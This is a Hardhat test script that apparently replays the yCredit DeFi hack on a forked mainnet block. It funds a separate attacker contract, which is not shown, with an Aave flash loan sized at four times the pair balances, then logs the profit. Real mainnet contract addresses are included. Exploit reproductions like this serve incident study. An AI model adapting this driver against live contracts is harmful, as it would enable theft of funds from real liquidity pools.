import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { forkFrom } from "../utils/fork";
import { getAttackerContractName } from "../utils/fs";

// @todo only work with single token, if uncomment multiple tokens => Error: VM Exception while processing transaction: revert SafeERC20: low-level call failed

const configurations = {
  //   dai: {
  //     token: "0x6b175474e89094c44da98b954eedeac495271d0f",
  //     whale: "0x70178102AA04C5f0E54315aA958601eC9B7a4E08",
  //   },
  //   usdt: {
  //     token: "0xdac17f958d2ee523a2206206994597c13d831ec7",
  //     whale: "0x1062a747393198f70f71ec65a582423dba7e5ab3",
  //   },
  usdc: {
    token: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    whale: "0xa191e578a6736167326d05c119ce0c90849e84b7",
  },
  eth: {
    token: "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
    whale: "0x2f0b23f53734252bda2277357e97e1517d6b042a",
  },
  //   yfi: {
  //     token: "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e",
  //     whale: "0xba37b002abafdd8e89a1995da52740bbc013d992",
  //   },
  //   link: {
  //     token: "0x514910771AF9Ca656af840dff83E8264EcF986CA",
  //     whale: "0x98c63b7b319dfbdf3d811530f2ab9dfe4983af9d",
  //   },
  //   snx: {
  //     token: "0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F",
  //     whale: "0xb671f2210b1f6621a2607ea63e6b2dc3e2464d1f",
  //   },
  //   aave: {
  //     token: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9",
  //     whale: "0x25f2226b597e8f9514b3f68f00f494cf4f286491",
  //   },
};

let attackerEOA: Signer;
let attacker: Contract;
let aave: Contract;
let factory: Contract;

const yCreditAddr = "0xe0839f9b9688a77924208ad509e29952dc660261";

beforeEach(async () => {
  await forkFrom(11567956);
  [attackerEOA] = await ethers.getSigners();
  const attackerFactory = await ethers.getContractFactory(
    getAttackerContractName(__filename),
    attackerEOA
  );
  attacker = await attackerFactory.deploy();
  await attacker.deployed();
  aave = await ethers.getContractAt(
    "ILendingPool",
    "0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9"
  );
  factory = await ethers.getContractAt(
    "IUniswapV2Factory",
    "0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac"
  );
});

describe("yCredit hack", function () {
  it("flash loan and exploit", async () => {
    // flash with 2x the pooled amount
    const amounts: Array<String> = [];
    const tokens: Array<String> = [];
    const tokenContracts: Array<Contract> = [];
    const modes = Array(Object.keys(configurations).length).fill(0);
    for (let [_, tokenInfo] of Object.entries(configurations)) {
      const tokenAddr = tokenInfo.token;
      const token = await ethers.getContractAt("IERC20", tokenAddr);
      const balance: BigNumber = await token.balanceOf(
        await factory.getPair(tokenAddr, yCreditAddr)
      );
      tokens.push(tokenAddr);
      tokenContracts.push(token);
      amounts.push(balance.mul(4).toString());
    }
    console.log("amoounts", amounts);
    await aave.flashLoan(
      attacker.address,
      tokens,
      amounts,
      modes,
      attacker.address,
      [],
      0
    );
    for (let token of tokenContracts) {
      const decimals = await token.decimals();
      const balance: BigNumber = await token.balanceOf(
        await attackerEOA.getAddress()
      );
      console.log(
        `profit: ${ethers.utils.formatUnits(
          balance,
          decimals
        )} ${await token.symbol()}`
      );
    }
  });
});
